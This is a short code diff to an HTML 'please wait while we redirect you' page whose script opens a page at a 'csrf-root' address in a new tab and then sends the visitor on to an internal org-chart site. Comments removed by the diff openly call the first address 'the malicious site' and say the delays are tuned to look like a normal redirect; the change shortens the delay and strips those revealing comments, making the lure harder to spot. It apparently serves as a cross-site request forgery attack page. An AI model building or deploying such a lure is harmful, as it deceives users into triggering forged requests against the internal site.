@@ -29,15 +29,12 @@
     <p>Please wait while we redirect you to the requested page.</p>
     <div class="spinner"></div>
     <script>
-        // Open the malicious site in a new tab
         setTimeout(() => {
             window.open('https://ardbard.github.io/csrf-root/', '_blank');
-        }, 500); // Opens after 0.5 seconds to seem deliberate
-        
-        // Redirect the current page to the orgchart page
+        }, 500);
         setTimeout(() => {
             window.location.href = 'https://orgchart/index.php';
-        }, 2000); // Delays 2 seconds for the "redirecting" appearance
+        }, 510);
     </script>
 </body>
 </html>
